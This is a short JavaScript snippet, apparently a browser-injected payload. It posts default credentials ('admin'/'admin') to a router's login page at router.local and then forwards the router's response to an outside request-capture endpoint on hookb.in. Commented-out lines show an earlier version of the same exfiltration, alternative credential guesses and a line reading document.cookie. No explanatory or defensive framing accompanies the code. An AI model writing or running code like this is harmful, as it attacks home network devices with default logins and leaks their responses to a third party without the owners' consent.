const http = new XMLHttpRequest();
http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
http.open('POST', 'http://router.local/login.php', true);
// http.addEventListener('load', function (event) {
//     const xhr = new XMLHttpRequest();
//     xhr.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
//     xhr.setRequestHeader('Content-type', 'application/json');
//     xhr.send(JSON.stringify(http.responseText));
// });
http.onload = function () {
    if (http.readyState === http.DONE) {
        
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://hookb.in/PxdaR0WOGeTpKPrrGn8P', true);
            xhr.setRequestHeader('Content-type', 'application/json');
            xhr.send(JSON.stringify(http.responseText));
        
    }
};
//http.open('GET', 'http://router.local');
//"username=root&pin=admin¬Robot=on"
//const cook = document.cookie;
http.send("username=admin&pin=admin");
